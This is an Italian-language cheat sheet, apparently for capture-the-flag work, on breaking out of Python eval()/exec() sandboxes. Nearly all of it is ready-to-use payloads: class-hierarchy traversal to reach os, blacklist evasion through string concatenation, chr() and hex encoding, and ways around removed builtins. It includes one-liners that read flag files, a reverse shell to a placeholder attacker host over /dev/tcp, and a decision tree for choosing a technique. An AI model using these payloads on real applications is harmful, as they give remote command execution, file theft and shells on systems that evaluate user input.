# Python Sandbox Bypass — eval()/exec() Exploitation

Tecniche per bypassare sandbox Python che usano eval(), exec() o ambienti restricted.

---

## 🔴 Quando Usare Questo File

- Target ha un campo che valuta espressioni Python (calcolatrice, REPL, etc.)
- Errore tipo "forbidden keyword" o "blocked function"
- Output suggerisce uso di eval/exec: `Result: <valore>Go back`

---

## 1. Accesso via \_\_subclasses\_\_

La tecnica più comune: risalgo all'oggetto base e trovo classi utili.

```python
# Enumera tutte le sottoclassi disponibili
().__class__.__bases__[0].__subclasses__()

# Cerca una classe che ha accesso a 'os' o 'subprocess'
# Indici comuni (variano per versione Python):
# - 40:  <class '_frozen_importlib.BuiltinImporter'>
# - 71:  <class 'os._wrap_close'>  ← MOLTO UTILE
# - 104: <class 'warnings.catch_warnings'>
# - 132: <class 'subprocess.Popen'>
```

### Payload Completi

```python
# Via os._wrap_close (indice 71 tipicamente)
().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag.txt').read()

# Via warnings.catch_warnings
''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()

# Trova l'indice giusto automaticamente:
[x for x in ().__class__.__bases__[0].__subclasses__() if 'wrap' in str(x)]
```

---

## 2. String Concatenation Bypass

Quando parole come `import`, `os`, `open` sono in blacklist.

```python
# Concatenazione semplice
getattr(__builtins__, '__imp'+'ort__')('o'+'s').system('cat /flag.txt')

# Con getattr annidato
getattr(getattr(__builtins__, '__imp'+'ort__')('o'+'s'), 'sys'+'tem')('id')

# Import mascherato
__builtins__.__dict__['__imp'+'ort__']('o'+'s').popen('id').read()
```

---

## 3. chr() Encoding

Converte ogni carattere in chr(N) per bypassare filtri stringa.

```python
# "os" = chr(111)+chr(115)
# "open" = chr(111)+chr(112)+chr(101)+chr(110)

# Payload:
getattr(__builtins__, chr(95)+chr(95)+'import'+chr(95)+chr(95))(chr(111)+chr(115)).system('id')

# Script per generare payload:
# ''.join([f'chr({ord(c)})+' for c in 'import'])[:-1]
```

---

## 4. Hex/Octal Encoding

```python
# "os" in hex
__import__('\x6f\x73').system('id')

# "open" con escape
exec('\x6f\x70\x65\x6e("/flag.txt").read()')
```

---

## 5. Unicode Bypass

Alcuni filtri non vedono caratteri Unicode equivalenti.

```python
# ᵒs invece di os (non sempre funziona)
# Usa NFKC normalization

# Fullwidth characters
ｏｓ.system('id')  # se normalizzazione automatica
```

---

## 6. Bypass senza Builtins

Se `__builtins__` è rimosso o svuotato.

```python
# Accesso via frame
import sys
sys._getframe().f_builtins['open']('/flag.txt').read()

# Via code object
(lambda: 0).__code__.co_consts

# Via type()
type('', (), {'__init__': lambda s: None})()
```

---

## 7. Eval-Specific Tricks

```python
# eval accetta solo espressioni, non statements
# MA possiamo usare:

# List comprehension per side effects
[__import__('os').system('id') for _ in [1]]

# Lambda execution
(lambda: __import__('os'))().system('id')

# Walrus operator (Python 3.8+)
(x := __import__('os')) or x.system('id')
```

---

## 8. Payload One-Liners Pronti

```python
# Leggi flag - via subclasses
().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag*').read()

# Leggi flag - via string concat
getattr(getattr(__builtins__,'__imp'+'ort__')('o'+'s'),'pop'+'en')('cat /flag*').read()

# Leggi flag - via chr
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(59)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(111)+chr(115)+chr(46)+chr(112)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(42)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(41))

# Shell reverse
().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].system('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"')
```

---

## 9. Enumerazione Automatica

```python
# Trova indice di una classe utile
for i, cls in enumerate(().__class__.__bases__[0].__subclasses__()):
    if 'os' in str(cls.__init__.__globals__.keys() if hasattr(cls.__init__, '__globals__') else []):
        print(i, cls)

# Versione one-liner (per eval)
[i for i,c in enumerate(().__class__.__bases__[0].__subclasses__()) if 'os' in str(getattr(getattr(c,'__init__',0),'__globals__',{}))]
```

---

## 🎯 Decision Tree

1. **Testo semplice eseguito?** → Prova `__subclasses__`
2. **Keyword bloccato?** → Usa string concatenation
3. **Caratteri bloccati?** → Usa chr() encoding
4. **`__builtins__` vuoto?** → Via frame o type()
5. **Solo espressioni?** → Lambda o list comprehension
